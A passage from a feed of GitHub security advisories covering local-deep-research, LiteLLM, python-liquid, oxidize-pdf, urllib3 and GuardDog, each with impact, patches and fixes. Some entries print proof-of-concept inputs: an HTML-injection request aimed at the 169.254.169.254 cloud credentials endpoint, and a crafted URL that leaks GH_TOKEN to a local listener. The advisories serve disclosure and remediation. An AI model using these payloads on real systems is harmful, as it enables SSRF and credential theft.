-<h2 id="proof-of-concept">Proof of Concept</h2>
-<p><strong>Step 1: Log in and submit a research query containing the injection payload</strong></p>
-<pre><code class="language-http">POST /api/start_research HTTP/1.1
-Host: localhost:5000
-Content-Type: application/json
-Cookie: session=&lt;valid_session&gt;
-
-{
-  "query": "&lt;/title&gt;&lt;img src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" onerror=\"x\"/&gt;",
-  "mode": "quick",
-  "model_provider": "OLLAMA",
-  "model": "llama3"
-}
-</code></pre>
-<p>The response returns a <code>research_id</code>, e.g. <code>"aaaa-bbbb-cccc-dddd"</code>.</p>
-<p><strong>Step 2: After the research completes, trigger PDF export</strong></p>
-<pre><code class="language-http">POST /api/v1/research/aaaa-bbbb-cccc-dddd/export/pdf HTTP/1.1
-Host: localhost:5000
-Cookie: session=&lt;valid_session&gt;
-X-CSRFToken: &lt;csrf_token&gt;
-</code></pre>
-<p><strong>Step 3: Intermediate HTML constructed server-side</strong></p>
-<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;
-&lt;meta charset="utf-8"&gt;
-&lt;title&gt;&lt;/title&gt;&lt;img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" onerror="x"/&gt;&lt;/title&gt;
-&lt;/head&gt;&lt;body&gt;
-...report content...
-&lt;/body&gt;&lt;/html&gt;
-</code></pre>
-<p><strong>Step 4: WeasyPrint issues an outbound HTTP request to the injected URL</strong></p>
-<p>Observed in network monitoring (e.g. <code>tcpdump</code>) or the target internal service logs:</p>
-<pre><code>GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
-Host: 169.254.169.254
-User-Agent: WeasyPrint/...
-</code></pre>
-<p><strong>Lightweight verification (no SSRF environment required):</strong></p>
-<p>Set the query to:</p>
-<pre><code>&lt;/title&gt;&lt;title&gt;INJECTED
-</code></pre>
-<p>The resulting HTML will contain two <code>&lt;title&gt;</code> tags and the PDF document metadata title will read <code>INJECTED</code>, confirming successful injection.</p>
-<hr>
-<h2 id="impact">Impact</h2>
-<h3 id="1-chained-ssrf-high-severity">1. Chained SSRF (High Severity)</h3>
-<p>By injecting <code>&lt;img src&gt;</code>, <code>&lt;link href&gt;</code>, or <code>&lt;style&gt;@import url()</code> tags pointing to internal addresses, WeasyPrint will issue HTTP requests on behalf of the server during PDF generation. This allows access to:</p>
-<ul>
-<li><strong>Cloud metadata services</strong> (<code>169.254.169.254</code>) on AWS, GCP, or Azure — enabling theft of IAM credentials and instance identity documents.</li>
-<li><strong>Internal network services</strong> (<code>192.168.x.x</code>, <code>10.x.x.x</code>) — enabling reconnaissance and interaction with internal APIs not exposed to the internet.</li>
-<li><strong>Localhost administrative interfaces</strong> — if SSRF protections are only applied at the user-input validation layer.</li>
-</ul>
-<p>This is an effective bypass of the application's existing SSRF defenses in <code>ssrf_validator.py</code>, because WeasyPrint's outbound resource requests are never routed through that validator.</p>
-<h3 id="2-html-document-structure-corruption">2. HTML Document Structure Corruption</h3>
-<p>Injected tags can prematurely close <code>&lt;head&gt;</code> and insert arbitrary content into <code>&lt;body&gt;</code>, causing WeasyPrint to render incorrectly or crash, resulting in a Denial of Service (DoS) condition for the export functionality.</p>
-<h3 id="3-css-injection-medium-severity">3. CSS Injection (Medium Severity)</h3>
-<p>By injecting <code>&lt;link&gt;</code> or <code>&lt;style&gt;</code> tags that load external stylesheets, an attacker can fully control the visual content of the generated PDF, enabling report content forgery or spoofing.</p>
-<h3 id="4-affected-scope">4. Affected Scope</h3>
-<ul>
-<li>All PDF export operations are affected.</li>
-<li>The vulnerability is reachable by any authenticated user — no elevated privileges required.</li>
-<li>Because each user operates against their own encrypted database, cross-user exploitation is not possible. However, on any shared or multi-tenant deployment, every authenticated user can independently trigger this vulnerability.</li>
-</ul>
-<hr>
-<h2 id="remediation">Remediation</h2>
-<p>Apply <code>html.escape()</code> to all user-controlled values before embedding them in the HTML template inside <code>_markdown_to_html</code>:</p>
-<pre><code class="language-python">import html
-
-if title:
-    html_parts.append(f"&lt;title&gt;{html.escape(title)}&lt;/title&gt;")
-
-if metadata:
-    for key, value in metadata.items():
-        html_parts.append(
-            f'&lt;meta name="{html.escape(str(key))}" content="{html.escape(str(value))}"&gt;'
-        )
-</code></pre>
-<p>Additionally, consider configuring WeasyPrint with a custom <code>url_fetcher</code> that blocks or restricts outbound HTTP requests to prevent SSRF via injected or legitimately-embedded external resources:</p>
-<pre><code class="language-python">def safe_url_fetcher(url, timeout=10):
-    from ssrf_validator import validate_url
-    if not validate_url(url):
-        raise ValueError(f"Blocked unsafe URL in PDF rendering: {url}")
-    return weasyprint.default_url_fetcher(url, timeout=timeout)
-
-html_doc = HTML(string=html_content, url_fetcher=safe_url_fetcher)
-</code></pre>
-<hr>
-<p><em>Report generated against commit <code>f3540fb3</code> — local-deep-research, branch <code>main</code>.</em></p>
-<hr>
-<h2 id="maintainer-note-2026-04-24">Maintainer note (2026-04-24)</h2>
-<p>Thanks @Firebasky for the detailed report. The complete remediation spans two PRs, both merged to <code>main</code>:</p>
-<p><strong>#3082</strong> (merged 2026-03-29, shipped in <strong>v1.5.0+</strong>) — closes the HTML-injection sinks:</p>
-<ul>
-<li><code>html.escape()</code> now wraps the <code>title</code> value in <code>&lt;title&gt;…&lt;/title&gt;</code></li>
-<li>Same for metadata keys/values in <code>&lt;meta name="…" content="…"&gt;</code></li>
-<li>Regression tests added in <code>tests/web/services/test_pdf_service.py</code></li>
-</ul>
-<p><strong>#3613</strong> (merged 2026-04-24, shipped in <strong>v1.6.0</strong>) — implements the <code>url_fetcher</code> recommendation from the Remediation section:</p>
-<ul>
-<li>New <code>_safe_url_fetcher</code> in <code>pdf_service.py</code> delegates to <code>weasyprint.default_url_fetcher</code> only after <code>security.ssrf_validator.validate_url</code> accepts the URL</li>
-<li>Blocks AWS metadata (169.254.169.254), RFC1918, loopback, and non-http(s) schemes</li>
-<li>Covers the chained SSRF path through any URL reaching the rendered HTML — markdown body, citations, raw-HTML passthrough via Python-Markdown</li>
-<li>Blocked URLs raise <code>UnsafePDFResourceURLError</code> (a <code>ValueError</code> subclass) so WeasyPrint skips the resource and the render continues</li>
-<li>8 regression tests, including an end-to-end render with <code>&lt;img src="http://169.254.169.254/…"&gt;</code> embedded in the body</li>
-</ul>
-<p><strong>Advisory metadata:</strong> CVSS <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N</code> (5.0 Moderate), CWEs <strong>CWE-79</strong> + <strong>CWE-918</strong>. <strong>Patched in v1.6.0</strong> — upgrade to v1.6.0 or later to receive both fixes.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/LearningCircuit/local-deep-research/security/advisories/GHSA-fj2m-qvh9-jq4q">https://github.com/LearningCircuit/local-deep-research/security/advisories/GHSA-fj2m-qvh9-jq4q</a></li>
-<li><a href="https://github.com/LearningCircuit/local-deep-research/pull/3082">https://github.com/LearningCircuit/local-deep-research/pull/3082</a></li>
-<li><a href="https://github.com/LearningCircuit/local-deep-research/pull/3613">https://github.com/LearningCircuit/local-deep-research/pull/3613</a></li>
-<li><a href="https://github.com/LearningCircuit/local-deep-research/commit/0148fa265a3da460c07def7441f9ac49ea61fbcb">https://github.com/LearningCircuit/local-deep-research/commit/0148fa265a3da460c07def7441f9ac49ea61fbcb</a></li>
-<li><a href="https://github.com/LearningCircuit/local-deep-research/commit/15f13d5c79847f1c38c2dc67bd0027c38af9e34b">https://github.com/LearningCircuit/local-deep-research/commit/15f13d5c79847f1c38c2dc67bd0027c38af9e34b</a></li>
-<li><a href="https://github.com/advisories/GHSA-fj2m-qvh9-jq4q">https://github.com/advisories/GHSA-fj2m-qvh9-jq4q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fj2m-qvh9-jq4q</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-11T19:40:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[litellm] LiteLLM has a sandbox escape in custom-code guardrail]]></title>
-        <id>https://github.com/advisories/GHSA-wxxx-gvqv-xp7p</id>
-        <link href="https://github.com/advisories/GHSA-wxxx-gvqv-xp7p"/>
-        <updated>2026-05-11T16:17:23.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The <code>POST /guardrails/test_custom_code</code> endpoint runs user-supplied Python inside a hand-rolled sandbox. The sandbox can be escaped using bytecode-level techniques, allowing arbitrary code execution in the proxy process — which runs as root in the default Docker image.</p>
-<p><strong>Reaching the endpoint requires a proxy-admin credential</strong> in default configurations.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in <strong><code>1.83.11</code></strong>. The hand-rolled sandbox has been replaced with <code>RestrictedPython</code>. Upgrade to <code>1.83.11</code> or later.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>If upgrading is not immediately possible, block <code>POST /guardrails/test_custom_code</code> at your reverse proxy or API gateway.</p>
-<h3 id="references">References</h3>
-<ul>
-<li>Patched release: <a href="https://github.com/BerriAI/litellm/releases/tag/v1.83.10-stable"><code>v1.83.10-stable</code></a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/BerriAI/litellm/security/advisories/GHSA-wxxx-gvqv-xp7p">https://github.com/BerriAI/litellm/security/advisories/GHSA-wxxx-gvqv-xp7p</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40217">https://nvd.nist.gov/vuln/detail/CVE-2026-40217</a></li>
-<li><a href="https://github.com/BerriAI/litellm/releases/tag/v1.83.10-stable">https://github.com/BerriAI/litellm/releases/tag/v1.83.10-stable</a></li>
-<li><a href="https://www.x41-dsec.de/lab/advisories/x41-2026-001-litellm">https://www.x41-dsec.de/lab/advisories/x41-2026-001-litellm</a></li>
-<li><a href="https://github.com/advisories/GHSA-wxxx-gvqv-xp7p">https://github.com/advisories/GHSA-wxxx-gvqv-xp7p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wxxx-gvqv-xp7p</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-11T16:17:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[litellm] Duplicate Advisory: LiteLLM has a sandbox escape in custom-code guardrail]]></title>
-        <id>https://github.com/advisories/GHSA-3926-2jvf-fg29</id>
-        <link href="https://github.com/advisories/GHSA-3926-2jvf-fg29"/>
-        <updated>2026-05-11T16:17:14.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
-<p>This advisory has been withdrawn because it is a duplicate of GHSA-wxxx-gvqv-xp7p. This link is maintained to preserve external references.</p>
-<h3 id="original-description">Original Description</h3>
-<p>LiteLLM through 2026-04-08 allows remote attackers to execute arbitrary code via bytecode rewriting at the /guardrails/test_custom_code URI.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40217">https://nvd.nist.gov/vuln/detail/CVE-2026-40217</a></li>
-<li><a href="https://www.x41-dsec.de/lab/advisories/x41-2026-001-litellm">https://www.x41-dsec.de/lab/advisories/x41-2026-001-litellm</a></li>
-<li><a href="https://github.com/advisories/GHSA-3926-2jvf-fg29">https://github.com/advisories/GHSA-3926-2jvf-fg29</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-3926-2jvf-fg29</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-10T15:31:57.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[python-liquid] python-liquid: Absolute paths escape filesystem loader search path]]></title>
-        <id>https://github.com/advisories/GHSA-8p4x-wr7x-3788</id>
-        <link href="https://github.com/advisories/GHSA-8p4x-wr7x-3788"/>
-        <updated>2026-05-11T14:57:44.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The built-in <code>FileSystemLoader</code> and <code>CachingFileSystemLoader</code> do not guard against reading files outside their search paths when given an absolute path to resolve. This allows malicious template authors to load and render arbitrary files via the <code>{% include %}</code> and <code>{% render %}</code> tags. Targeted files would need to contain valid Liquid markup and be readable by the application process.</p>
-<h3 id="patches">Patches</h3>
-<p>The issue is fixed in version 2.2.0 with the inclusion of a <code>template_path.is_absolute()</code> condition in <code>liquid/builtin/loaders/file_system_loader.py</code>.</p>
-<pre><code class="language-python">        if os.path.pardir in template_path.parts or template_path.is_absolute():
-            raise TemplateNotFoundError(template_name)
-</code></pre>
-<h3 id="workarounds">Workarounds</h3>
-<p>Create a custom template loader by inheriting from <code>FileSystemLoader</code> and overriding <code>resolve_path()</code>. Use an instance of the custom loader as the <code>loader</code> argument when instantiating your Liquid environment. </p>
-<pre><code class="language-python">import os
-from pathlib import Path
-
-from liquid import Environment
-from liquid import FileSystemLoader
-from liquid.exceptions import TemplateNotFoundError
-
-
-class MyFileSystemLoader(FileSystemLoader):
-    def resolve_path(self, template_name: str) -&gt; Path:
-        template_path = Path(template_name)
-
-        if self.ext and not template_path.suffix:
-            template_path = template_path.with_suffix(self.ext)
-
-        if os.path.pardir in template_path.parts or template_path.is_absolute():
-            raise TemplateNotFoundError(template_name)
-
-        for path in self.search_path:
-            source_path = path.joinpath(template_path)
-            if not source_path.exists():
-                continue
-            return source_path
-
-        raise TemplateNotFoundError(template_name)
-
-
-env = Environment(loader=MyFileSystemLoader("path/to/templates/"))
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/jg-rp/liquid/security/advisories/GHSA-8p4x-wr7x-3788">https://github.com/jg-rp/liquid/security/advisories/GHSA-8p4x-wr7x-3788</a></li>
-<li><a href="https://github.com/advisories/GHSA-8p4x-wr7x-3788">https://github.com/advisories/GHSA-8p4x-wr7x-3788</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8p4x-wr7x-3788</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-11T14:57:43.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[oxidize-pdf] oxidize-pdf: NaN/inf bypass in colour content-stream emission causes PDF rejection (DoS)]]></title>
-        <id>https://github.com/advisories/GHSA-88q9-cmp2-c2vq</id>
-        <link href="https://github.com/advisories/GHSA-88q9-cmp2-c2vq"/>
-        <updated>2026-05-11T14:53:27.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>  <code>oxidize-pdf</code> defines <code>Color</code> as a <code>pub enum</code> with public tuple-struct variants <code>Rgb(f64, f64, f64)</code>, <code>Gray(f64)</code>, and <code>Cmyk(f64, f64, f64, f64)</code>. The constructors <code>Color::rgb</code>, <code>Color::gray</code>, and <code>Color::cmyk</code> clamp incoming
-  components to <code>[0.0, 1.0]</code>, but because the variants are <code>pub</code>, callers can construct values directly without going through the constructors:</p>
-<pre><code class="language-rust">let safe   = Color::rgb(f64::NAN, 0.5, 0.5);   // clamps NaN to 0.0
-let attack = Color::Rgb(f64::NAN, 0.5, 0.5);    // bypasses clamp
-
-Color: Copy allows the non-finite value to propagate freely through API surfaces and serialisation. When such a value reaches a content-stream emitter, the writer formats it via format!("{:.3}", v). The Rust standard library renders
-f64::NAN as "NaN", f64::INFINITY as "inf", and f64::NEG_INFINITY as "-inf" — none of which are valid PDF numeric tokens per ISO 32000-1 §7.3.3:
-
-▎ A numeric object shall be represented by one or more decimal digits with an optional sign and a leading, trailing, or embedded PERIOD.
-
-The resulting content stream contains an invalid token sequence (e.g. NaN 0.500 0.500 rg). Conformant PDF viewers (Adobe Acrobat, Foxit, PDF.js, Apple Preview) reject the content stream, the affected page, or the entire document
-depending on parser strictness.
-
-Affected packages (all listed in the "Affected products" section of this advisory):
-
-- oxidize-pdf on crates.io — the core Rust library where the vulnerable code path lives.
-- OxidizePdf.NET on NuGet — .NET FFI binding that exposes Color through its public API; inherits the vulnerability from its dependency on oxidize-pdf.
-- oxidize-pdf on PyPI — Python bindings (PyO3) that similarly expose colour construction; inherits the vulnerability from its dependency.
-
-Who is impacted: any application that uses these packages to generate PDFs and accepts user-influenced colour values without validation. The most exposed surfaces are server-side PDF generators that take arbitrary f64 colour
-parameters from upstream services.
-
-Reproduction (Rust API):
-use oxidize_pdf::{Document, Page, graphics::Color};
-
-let mut doc = Document::new();
-let mut page = Page::a4();
-let gc = page.graphics();
-gc.set_fill_color(Color::Rgb(f64::NAN, 0.5, 0.5));
-gc.rectangle(50.0, 50.0, 100.0, 100.0).fill();
-doc.add_page(page);
-doc.save("malformed.pdf").unwrap();
-
-// The resulting content stream contains:
-//   NaN 0.500 0.500 rg
-//   50 50 100 100 re
-//   f
-// which conformant viewers reject.
-
-Affected sites in oxidize-pdf 2.5.7 (the same code paths are reached by both .NET and Python bindings via FFI):
-
-- oxidize-pdf-core/src/text/flow.rs (TextFlowContext)
-- oxidize-pdf-core/src/text/mod.rs (TextContext::apply_text_state_parameters)
-- oxidize-pdf-core/src/graphics/mod.rs (GraphicsContext::apply_fill_color / apply_stroke_color)
-- oxidize-pdf-core/src/graphics/patterns.rs (create_checkerboard_pattern / create_stripe_pattern / create_dots_pattern)
-- ~45 sibling sites across forms/*, annotations/*, layout/rich_text.rs, and writer/pdf_writer/mod.rs that emit colour through the same code path.
-
-Patches
-
-The fix introduces a sanitising helper at the emission boundary in graphics/color.rs:
-
-pub(crate) fn finite_or_zero(val: f64) -&gt; f64 {
-    if val.is_finite() { val } else { 0.0 }
-}
-
-Every colour-operator emitter (~50 sites across 17 files) now routes through fill_color_op / stroke_color_op / write_fill_color / write_stroke_color, which apply finite_or_zero before formatting. Non-finite components are substituted
-with 0.0, so the wire format remains ISO 32000-1 conformant regardless of the input.
-
-Patched releases:
-
-- oxidize-pdf 2.6.0 on crates.io — contains the fix at the source.
-- OxidizePdf.NET on NuGet — bumped to depend on oxidize-pdf 2.6.0 (see "Patched versions" above).
-- oxidize-pdf on PyPI — bumped to depend on oxidize-pdf 2.6.0 (see "Patched versions" above).
-
-Users should upgrade to the patched version of whichever package(s) they consume.
-
-Workarounds
-
-For users who cannot upgrade immediately:
-
-- Always construct colours via the safe constructors Color::rgb(), Color::gray(), Color::cmyk(), which clamp components to [0.0, 1.0] (no NaN/inf survives clamping).
-- Never use direct enum construction (Color::Rgb(...), Color::Gray(...), Color::Cmyk(...)) when components originate from untrusted input. The same applies to the corresponding APIs in the .NET and Python bindings.
-- Validate untrusted f64 colour inputs with f64::is_finite() (Rust) or equivalent checks (!double.IsFinite(v) in .NET, math.isfinite(v) in Python) before passing them to any oxidize-pdf API.
-
-These mitigations are partial — they cover the application layer but not other code paths that may construct Color values internally. The full fix is the upgrade to the patched versions.
-
-References
-
-- Issue: https://github.com/bzsanti/oxidizePdf/issues/220
-- Companion refactor: https://github.com/bzsanti/oxidizePdf/issues/221
-- Fix PR: https://github.com/bzsanti/oxidizePdf/pull/225
-- Release PR (oxidize-pdf 2.6.0): https://github.com/bzsanti/oxidizePdf/pull/226
-- .NET binding repository: https://github.com/bzsanti/oxidize-pdf-dotnet
-- Python binding repository: https://github.com/bzsanti/oxidize-python
-- ISO 32000-1 §7.3.3 (Numeric Objects): https://www.iso.org/standard/51502.html
-
-A broader follow-up tracks the same CWE class in non-colour numeric content-stream emitters (line widths, transformation matrices, dash arrays, text positioning, path operators) — to be addressed in oxidize-pdf 2.7.0 with its own
-advisory.
-### References
-
-- &lt;https://github.com/bzsanti/oxidizePdf/security/advisories/GHSA-88q9-cmp2-c2vq&gt;
-- &lt;https://github.com/advisories/GHSA-88q9-cmp2-c2vq&gt;
-</code></pre>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-88q9-cmp2-c2vq</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-11T14:53:25.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[urllib3] urllib3: Decompression-bomb safeguards bypassed in parts of the streaming API]]></title>
-        <id>https://github.com/advisories/GHSA-mf9v-mfxr-j63j</id>
-        <link href="https://github.com/advisories/GHSA-mf9v-mfxr-j63j"/>
-        <updated>2026-05-11T14:51:46.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>urllib3's <a href="https://urllib3.readthedocs.io/en/2.7.0/advanced-usage.html#streaming-and-i-o">streaming API</a> is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.</p>
-<p>urllib3 can perform decompression based on the HTTP <code>Content-Encoding</code> header (e.g., <code>gzip</code>, <code>deflate</code>, <code>br</code>, or <code>zstd</code>). When using the streaming API since version 2.6.0, the library decompresses only the necessary bytes, enabling partial content consumption.</p>
-<p>However, urllib3 before version 2.7.0 could still decompress the whole response instead of the requested portion in two cases:</p>
-<ol>
-<li>During the second <code>HTTPResponse.read(amt=N)</code> call when the response was decompressed using the official <a href="https://pypi.org/project/brotli/">Brotli</a> library.</li>
-<li>When <code>HTTPResponse.drain_conn()</code> was called after the response had been read and decompressed partially (compression algorithm did not matter here).</li>
-</ol>
-<p>These issues could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This could result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side.</p>
-<h3 id="affected-usages">Affected usages</h3>
-<p>Applications and libraries using urllib3 versions earlier than 2.7.0 may be affected when streaming compressed responses from untrusted sources in either of these cases, unless decompression is explicitly disabled:</p>
-<ol>
-<li>A response encoded with <code>br</code> is read incrementally with at least two <code>HTTPResponse.read(amt=N)</code> or <code>HTTPResponse.stream(amt=N)</code> calls while using the official <a href="https://pypi.org/project/brotli/">Brotli</a> library.</li>
-<li><code>HTTPResponse.drain_conn()</code> is called after response decompression has already started.</li>
-</ol>
-<h3 id="remediation">Remediation</h3>
-<p>Upgrade to at least urllib3 version 2.7.0 in which the library:</p>
-<ol>
-<li>Is more efficient for reads with Brotli.</li>
-<li>Always skips decompression for <code>HTTPResponse.drain_conn()</code>.</li>
-</ol>
-<p>If upgrading is not immediately possible, the following workarounds may reduce exposure in specific cases:</p>
-<ol>
-<li>For the Brotli-specific issue only, switch from <a href="https://pypi.org/project/brotli/">brotli</a> to <a href="https://pypi.org/project/brotlicffi/">brotlicffi</a> until you can upgrade urllib3; the official Brotli package is affected because of <a href="https://github.com/google/brotli/issues/1396">https://github.com/google/brotli/issues/1396</a>.</li>
-<li>If your code explicitly calls <code>HTTPResponse.drain_conn()</code>, call <code>HTTPResponse.close()</code> instead when connection reuse is not important.</li>
-</ol>
-<h3 id="credits">Credits</h3>
-<p>The Brotli-specific issue was reported by @kimkou2024.
-<code>HTTPResponse.drain_conn()</code> inefficiency was reported by @Cycloctane.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/urllib3/urllib3/security/advisories/GHSA-mf9v-mfxr-j63j">https://github.com/urllib3/urllib3/security/advisories/GHSA-mf9v-mfxr-j63j</a></li>
-<li><a href="https://github.com/advisories/GHSA-mf9v-mfxr-j63j">https://github.com/advisories/GHSA-mf9v-mfxr-j63j</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mf9v-mfxr-j63j</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-11T14:51:45.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[urllib3] urllib3: Sensitive headers forwarded across origins in proxied low-level redirects]]></title>
-        <id>https://github.com/advisories/GHSA-qccp-gfcp-xxvc</id>
-        <link href="https://github.com/advisories/GHSA-qccp-gfcp-xxvc"/>
-        <updated>2026-05-11T14:51:22.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>When following cross-origin redirects for requests made using urllib3’s high-level APIs, such as <code>urllib3.request()</code>, <code>PoolManager.request()</code>, and <code>ProxyManager.request()</code>, sensitive headers — <code>Authorization</code>, <code>Cookie</code>, and <code>Proxy-Authorization</code> (defined in <code>Retry.DEFAULT_REMOVE_HEADERS_ON_REDIRECT</code>) — are stripped by default, as expected.</p>
-<p>However, cross-origin redirects followed from the low-level API via <code>ProxyManager.connection_from_url().urlopen(..., assert_same_host=False)</code> still forward these sensitive headers.</p>
-<h3 id="affected-usage">Affected usage</h3>
-<p>Applications and libraries using urllib3 versions earlier than 2.7.0 may be affected if they allow cross-origin redirects while making requests through <code>HTTPConnection.urlopen()</code> instances created via <code>ProxyManager.connection_from_url()</code>.</p>
-<h3 id="remediation">Remediation</h3>
-<p>Upgrade to urllib3 version 2.7.0 or later, in which sensitive headers are stripped from redirects followed by <code>HTTPConnection</code>.</p>
-<p>If upgrading is not immediately possible, avoid using this low-level redirect flow for cross-origin redirects. If appropriate for your use case, switch to <code>ProxyManager.request()</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/urllib3/urllib3/security/advisories/GHSA-qccp-gfcp-xxvc">https://github.com/urllib3/urllib3/security/advisories/GHSA-qccp-gfcp-xxvc</a></li>
-<li><a href="https://github.com/advisories/GHSA-qccp-gfcp-xxvc">https://github.com/advisories/GHSA-qccp-gfcp-xxvc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qccp-gfcp-xxvc</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-11T14:51:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[guarddog] GuardDog has a blind GitHub URL rewrite in remote project scanning causes SSRF and `GH_TOKEN` exfiltration]]></title>
-        <id>https://github.com/advisories/GHSA-587r-mc96-6f2p</id>
-        <link href="https://github.com/advisories/GHSA-587r-mc96-6f2p"/>
-        <updated>2026-05-11T14:45:09.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
-<p>The programmatic remote project scanning path rewrites attacker-controlled repository URLs using a blind string replacement and then sends the caller's GitHub credentials with the resulting request. This allows an attacker who can influence the scanned repository URL to trigger SSRF and capture the <code>GH_TOKEN</code> used by GuardDog.</p>
-<h1 id="description">Description</h1>
-<p><code>ProjectScanner.scan_remote()</code> takes a <code>url</code>, <code>branch</code>, and <code>requirements_name</code>, then constructs a raw GitHub URL by calling:</p>
-<pre><code class="language-python">githubusercontent_url = url.replace("github", "raw.githubusercontent")
-req_url = f"{githubusercontent_url}/{branch}/{requirements_name}"
-resp = requests.get(url=req_url, auth=token)
-</code></pre>
-<p>Because this logic does not parse or validate the hostname, a crafted URL such as:</p>
-<pre><code class="language-text">http://github@127.0.0.1:18081/owner/repo
-</code></pre>
-<p>is transformed into:</p>
-<pre><code class="language-text">http://raw.githubusercontent@127.0.0.1:18081/owner/repo/main/requirements.txt
-</code></pre>
-<p>Requests interprets this as an HTTP request to <code>127.0.0.1:18081</code>, and GuardDog includes the configured GitHub credentials via HTTP Basic Auth.</p>
-<h1 id="reproduction-summary">Reproduction summary</h1>
-<ol>
-<li>Start an HTTP listener on <code>127.0.0.1:18081</code> that logs the request path and <code>Authorization</code> header.</li>
-<li>Set <code>GIT_USERNAME=alice</code> and <code>GH_TOKEN=supersecret</code>.</li>
-<li>Call <code>PypiRequirementsScanner().scan_remote("http://github@127.0.0.1:18081/owner/repo", "main", "requirements.txt")</code>.</li>
-<li>Observe a request to <code>/owner/repo/main/requirements.txt</code> with <code>Authorization: Basic YWxpY2U6c3VwZXJzZWNyZXQ=</code>.</li>
-</ol>
-<h1 id="key-code-paths">Key code paths</h1>
-<ul>
-<li><code>guarddog/scanners/scanner.py:361-365</code></li>
-</ul>
-<h1 id="practical-impact">Practical impact</h1>
-<p>This can expose repository-scanning infrastructure to:</p>
-<ul>
-<li>theft of the GitHub PAT configured in <code>GH_TOKEN</code></li>
-<li>SSRF to internal or localhost services reachable by the scanner</li>
-<li>attacker-controlled dependency file content returned by the malicious endpoint</li>
-</ul>
-<h1 id="prior-public-disclosure-check">Prior public disclosure check</h1>
-<p>As of 2026-03-18, no matching public GitHub advisory, CVE, or public repo issue was found for this specific bug.</p>
-<h1 id="suggested-fix">Suggested fix</h1>
-<p>Parse the input URL, require <code>hostname == "github.com"</code>, validate the path shape (<code>owner/repo</code>), build the raw URL from parsed components instead of string replacement, and never send GitHub credentials to non-GitHub hosts.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/DataDog/guarddog/security/advisories/GHSA-587r-mc96-6f2p">https://github.com/DataDog/guarddog/security/advisories/GHSA-587r-mc96-6f2p</a></li>
-<li><a href="https://github.com/advisories/GHSA-587r-mc96-6f2p">https://github.com/advisories/GHSA-587r-mc96-6f2p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-587r-mc96-6f2p</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-11T14:45:08.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[guarddog] GuardDog: Unsanitized human-readable scan output allows terminal escape injection from malicious package content]]></title>
-        <id>https://github.com/advisories/GHSA-m5p4-gvpx-4mvr</id>
-        <link href="https://github.com/advisories/GHSA-m5p4-gvpx-4mvr"/>
-        <updated>2026-05-11T14:43:45.000Z</updated>
